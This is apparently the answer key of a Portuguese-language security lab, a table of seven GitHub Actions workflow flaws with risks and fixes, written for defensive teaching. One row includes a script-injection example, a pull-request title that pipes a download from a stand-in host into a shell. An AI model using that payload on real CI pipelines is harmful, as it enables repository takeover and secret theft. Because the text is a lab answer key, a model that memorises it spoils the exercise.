# Relatório de vulnerabilidades – GitHub Actions (gabarito do laboratório)

Aplicação analisada: `actions-security-lab` · Pasta analisada: `.github/workflows`

| Nº | Vulnerabilidade | Arquivo | Linha/trecho | Risco | Evidência | Correção |
|----|-----------------|---------|--------------|-------|-----------|----------|
| 1 | Permissões excessivas do GITHUB_TOKEN | `ci.yml` | L8: `permissions: write-all` | Qualquer step comprometido pode alterar código, releases, issues e demais recursos do repositório | _Inserir print_ | `permissions: contents: read` no topo; `contents: write` apenas no job que cria a release |
| 2 | Permissões excessivas do GITHUB_TOKEN | `pr-target.yml` | L7–9: `contents: write` e `pull-requests: write` | Código de PR roda com escrita no repositório de destino | _Inserir print_ | Remover escrita; usar `contents: read` |
| 3 | Credencial escrita no YAML / exposta em log | `ci.yml` | L12: `DEPLOY_TOKEN: ghp_...` e L28: `echo ... ${{ env.DEPLOY_TOKEN }}` | Qualquer pessoa com acesso de leitura ao repositório vê o token, que ainda é impresso nos logs | _Inserir print_ | Revogar o token, guardar em *Settings > Secrets* e usar `${{ secrets.DEPLOY_TOKEN }}`; nunca imprimir no log |
| 4 | Injeção de script | `pr-title.yml` | L13–15: `${{ github.event.pull_request.title }}`, `.body` e `github.head_ref` dentro de `run:` | Um título como `"; curl evil.sh \| sh; "` é executado pelo shell do runner | _Inserir print_ | Passar os valores por `env:` e usar `"$PR_TITLE"` no script |
| 5 | Ações de terceiros não fixadas | `ci.yml` | L18: `actions/checkout@main`; L20: `setup-node@v4`; L31: `softprops/action-gh-release@v2` | Tag ou branch pode ser movida para código malicioso (ataque à cadeia de suprimentos) | _Inserir print_ | Fixar em SHA completo de 40 caracteres, com a versão em comentário |
| 6 | `pull_request_target` com código não confiável | `pr-target.yml` | L4: `pull_request_target`; L16–18: checkout de `head.sha`; L20: `npm test` | O código do PR (inclusive de forks) roda com privilégios e acesso a secrets (L23) | _Inserir print_ | Usar o gatilho `pull_request`, sem secrets; se for preciso `pull_request_target`, nunca fazer checkout nem executar código do PR |
| 7 | Uso desnecessário de secret em código não confiável | `pr-target.yml` | L23: `API_SECRET: ${{ secrets.API_SECRET }}` | O secret fica disponível para código do PR | _Inserir print_ | Remover o secret deste workflow |

Versões corrigidas: pasta `corrigido/workflows/`.
